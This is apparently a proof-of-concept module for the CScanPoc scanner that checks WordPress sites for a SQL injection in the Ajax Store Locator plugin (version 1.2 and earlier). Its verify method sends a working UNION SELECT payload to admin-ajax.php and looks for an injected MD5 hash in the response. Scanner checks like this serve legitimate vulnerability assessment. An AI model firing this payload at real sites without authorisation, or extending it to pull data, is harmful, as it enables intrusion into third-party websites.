# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'WordPress_0010'  # 平台漏洞编号，留空
    name = 'WordPress Ajax Store Locator SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-16'  # 漏洞公布时间
    desc = '''
        The "sl_dal_searchlocation_cbf" ajax function is affected from SQL Injection vulnerability.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36777/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Ajax Store Locator<= 1.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ac4b0875-909a-485f-be09-50a0d0ff277c'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ('/wp-admin/admin-ajax.php?action=sl_dal_searchlocation&funMethod=SearchStore'
                       '&Location=Social&StoreLocation=1~1+UNION+SELECT+1,2,3,4,md5(233),6,7,8,9,10'
                       ',11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--')
            verify_url = self.target + payload

            content = requests.get(verify_url).content
            if 'e165421110ba03099a1c0393373c5b43' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
